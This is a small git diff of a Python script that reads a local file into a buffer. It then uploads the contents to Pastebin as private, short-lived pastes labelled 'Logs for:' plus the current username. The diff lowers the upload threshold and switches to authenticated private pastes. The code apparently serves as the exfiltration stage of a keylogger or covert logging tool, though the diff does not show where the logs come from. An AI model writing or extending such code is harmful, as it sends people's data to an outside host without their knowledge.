@@ -22,7 +22,6 @@ def get_timestamp_str():
 
 # Define API & connect to pastebin
 def get_pastebin_api():
-    
     load_dotenv()
     api_dev_key = en['API_DEV_KEY']
     username = en['P_USERNAME']
@@ -62,9 +61,10 @@ def fill_buffer_upload(myInode, uploadInterval):
         bufferToUp[get_timestamp_str()]= f.read()
         print(bufferToUp)
         print("DEBUGGING SIZE: {} \n".format(sys.getsizeof(bufferToUp)))
-        if(sys.getsizeof(bufferToUp)>700):
+        print(">>>>".format(api))
+        if(sys.getsizeof(bufferToUp)>200):
             data = json.dumps(bufferToUp)
-            result = api.paste(data, guest=True, name="Logs for: {}".format(getpass.getuser()), format='json', private='1', expire='1H')
+            result = api.paste(data, guest=False, name="Logs for: {}".format(getpass.getuser()), format='json', private='2', expire='1H')
             sleep(2)
             print(result)
             if 'Bad API request' not in result:
